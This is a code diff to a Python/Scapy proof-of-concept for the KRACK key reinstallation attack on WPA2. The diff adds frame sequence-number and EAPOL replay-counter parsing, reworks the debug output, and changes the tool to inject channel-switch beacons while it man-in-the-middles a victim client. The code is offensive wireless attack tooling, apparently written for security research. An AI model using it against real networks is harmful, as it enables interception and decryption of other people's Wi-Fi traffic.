@@ -7,12 +7,11 @@ from datetime import datetime
 from wpaspy import Ctrl
 
 # TODO:
-# - Forward frames properly from the real channel to the rogue channel so the client gets added by hostapd
 # - Option to continously send CSA beacon frames on the real channel
 #
-# - Print sequence numbers of received frames
+# - If EAPOL-Msg4 has been received on the real channel, the attack has failed
+# - Delete created *sta virtual interfaces
 # - Victim client does not go through all stages. ClientState.GotMitm not set currently.
-# - Display EAPOL replay counters in _rx debug output
 # - Detect usage off all-zero key by decrypting frames (so we can miss some frames safely)
 # - Detect when all frames are sent on the reall channel, and if so, deauthenticate
 # - ACK frames of the real AP sent to ALL clients (currently we only call those of the targeted client)
@@ -84,6 +83,21 @@ def send_dot11(socket, p):
 	socket.send(RadioTap()/p)
 	log(DEBUG, "Injected frame: %s" % dot11_to_str(p))
 
+def dot11_get_seqnum(p):
+	return p[Dot11].SC >> 4
+
+def dot11_get_iv(p):
+	"""Scapy can't handle Extended IVs, so do this properly ourselves"""
+	if Dot11WEP not in p:
+		log(ERROR, "INTERNAL ERROR: Requested IV of plaintext frame")
+		return 0
+
+	wep = p[Dot11WEP]
+	if wep.keyid & 32:
+		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (struct.unpack(">I", wep.wepdata[:4])[0] << 16)
+	else:
+		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (ord(wep.iv[2]) << 16)
+
 def get_eapol_msgnum(p):
 	FLAG_PAIRWISE = 0b0000001000
 	FLAG_ACK      = 0b0010000000
@@ -107,21 +121,28 @@ def get_eapol_msgnum(p):
 
 	return 0
 
+def get_eapol_replaynum(p):
+	return struct.unpack(">Q", str(p[EAPOL])[9:17])[0]
+
 def dot11_to_str(p):
-	if Dot11Beacon in p:      return "Beacon(TSF=%d)" % p[Dot11Beacon].timestamp
-	elif Dot11ProbeReq in p:  return "ProbeReq"
-	elif Dot11ProbeResp in p: return "ProbeResp"
-	elif Dot11Auth in p:      return "Auth(status=%d)" % p[Dot11Auth].status
-	elif Dot11Deauth in p:    return "Deauth(reason=%d)" % p[Dot11Deauth].reason
-	elif Dot11AssoReq in p:   return "AssoReq"
-	elif Dot11AssoResp in p:  return "AssoResp(status=%d)" % p[Dot11AssoResp].status
-	elif Dot11Disas in p:     return "Disas"
-	elif Dot11WEP in p:       return "EncryptedData(IV=%d)" % dot11_get_iv(p)
-	elif p.type == 1 and p.subtype == 11: return "BlockAck"
-	elif p.type == 1 and p.subtype == 13: return "Ack"
-	elif EAPOL in p:
-		if get_eapol_msgnum(p) != 0: return "EAPOL msg%d" % get_eapol_msgnum(p)
-		else:                        return repr(p)
+	if p.type == 0:
+		if Dot11Beacon in p:    return "Beacon(seq=%d, TSF=%d)" % (dot11_get_seqnum(p), p[Dot11Beacon].timestamp)
+		if Dot11ProbeReq in p:  return "ProbeReq(seq=%d)" % dot11_get_seqnum(p)
+		if Dot11ProbeResp in p: return "ProbeResp(seq=%d)" % dot11_get_seqnum(p)
+		if Dot11Auth in p:      return "Auth(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11Auth].status)
+		if Dot11Deauth in p:    return "Deauth(seq=%d, reason=%d)" % (dot11_get_seqnum(p), p[Dot11Deauth].reason)
+		if Dot11AssoReq in p:   return "AssoReq(seq=%d)" % dot11_get_seqnum(p)
+		if Dot11AssoResp in p:  return "AssoResp(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11AssoResp].status)
+		if Dot11Disas in p:     return "Disas(seq=%d)" % dot11_get_seqnum(p)
+	elif p.type == 1:
+		if p.subtype == 11:     return "BlockAck"
+		if p.subtype == 13:     return "Ack"
+	elif p.type == 2:
+		if Dot11WEP in p:         return "EncryptedData(seq=%d, IV=%d)" % (dot11_get_seqnum(p), dot11_get_iv(p))
+		if p.subtype == 12:       return "QoS-Null(seq=%d)" % dot11_get_seqnum(p)
+		if EAPOL in p:
+			if get_eapol_msgnum(p) != 0: return "EAPOL-Msg%d(seq=%d,replay=%d)" % (get_eapol_msgnum(p), dot11_get_seqnum(p), get_eapol_replaynum(p))
+			else:                        return repr(p)
 	return repr(p)			
 
 def construct_csa(channel, count=1):
@@ -151,18 +172,6 @@ def get_tlv_value(p, type):
 		if el.ID == IEEE_TLV_TYPE_SSID:
 			return el.info
 	return None
-
-def dot11_get_iv(p):
-	"""Scapy can't handle Extended IVs, so do this properly ourselves"""
-	if Dot11WEP not in p:
-		log(ERROR, "INTERNAL ERROR: Requested IV of plaintext frame")
-		return 0
-
-	wep = p[Dot11WEP]
-	if wep.keyid & 32:
-		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (struct.unpack(">I", wep.wepdata[:4])[0] << 16)
-	else:
-		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (ord(wep.iv[2]) << 16)
 
 
 #### Man-in-the-middle Code ####
@@ -425,7 +434,7 @@ class KRAckAttack():
 
 				# ... with an extra clear warning when we wanted to MitM this specific client
 				if self.clientmac == p.addr2:
-					log(WARNING, "Client %s is connecting to the AP on the real channel. MitM failed." % self.clientmac)
+					log(WARNING, "Client %s is connecting on real channel, injecting CSA beacon to try to correct." % self.clientmac)
 
 				if p.addr2 in self.clients: del self.clients[p.addr2]
 				#self.try_channel_switch(p.addr2) # FIXME TODO FIXME TODO FIXME
@@ -551,6 +560,7 @@ class KRAckAttack():
 					iv = dot11_get_iv(p)
 					if iv <= 1: log(DEBUG, "Ciphertext: " + encrypted.encode("hex"), showtime=False)
 
+					# FIXME: The reused IV could be one we accidently missed due to high traffic!!!
 					if client.is_iv_reused(iv):
 						# If the same keystream is reused, we have a normal key reinstallation attack
 						if keystream == client.get_keystream(iv):
